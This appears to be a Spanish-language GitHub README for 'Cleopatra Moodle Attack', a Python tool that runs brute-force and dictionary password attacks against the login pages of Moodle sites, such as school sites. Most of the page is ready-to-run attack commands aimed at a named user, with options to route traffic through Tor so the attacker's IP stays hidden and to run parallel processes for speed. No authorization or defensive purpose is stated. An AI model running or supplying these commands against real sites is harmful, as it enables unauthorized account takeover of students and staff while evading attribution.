# Cleopatra Moodle Attack

![enter image description here](https://i.imgur.com/MlDQz9I.png)
<br>

<p align="left">
<img src="https://img.shields.io/badge/Creado%20por-RamPanic-green">
<img src="https://img.shields.io/badge/Hecho en%20-Python3-red">
    <a href="https://github.com/RamPanic?tab=repositories"><img src="https://img.shields.io/badge/Ver%20m%C3%A1s-repositorios-yellow"></a>
</p>

Cleopatra Moodle Attack (CMA) es una herramienta que le permite lanzar ataques de fuerza bruta o de diccionario en los login de sitios web basados en la plataforma Moodle.

## Instalar requerimientos

```bash
pip3 install -r requirements.txt
```

## Instalar servicio Tor y lanzar ataque

No sería discreto utilizar nuestra dirección de IP para realizar el ataque, por ende hay que cambiarla, para esto utilizaremos el servicio Tor.

### Sistemas Linux

#### Debian

```bash
sudo apt install -y tor
```
#### Arch

```bash
sudo pacman -S tor
```

### Lanzar con bandera

```bash
python3 cleopatra.py --user scorpion --url https://example.edu.ar/login/index.php -t dictionary --successful-pattern "User details" -w wordlist.lst --tor-proxy
```

## Ataque en paralelo

Con CMA podremos utilizar la potencia de la CPU para obtener la contraseña más rápido.

```bash
python3 cleopatra.py --user scorpion --url https://example.edu.ar/login/index.php -t dictionary --successful-pattern "User details" -w wordlist.lst --processes 4
```

*Advertencia*: utilice esta bandera bajo su propio riesgo, su sistema podría colapsar por un mal uso.

## Ejemplo de ataque por diccionario

```bash
python3 cleopatra.py --user scorpion --url https://example.edu.ar/login/index.php -t dictionary --successful-pattern "User details" -w wordlist.lst
```

## Muestras

![cleopatra-help](https://i.imgur.com/qHkOEu8.png)
![cleopatra](https://i.imgur.com/4DNmzTs.png)

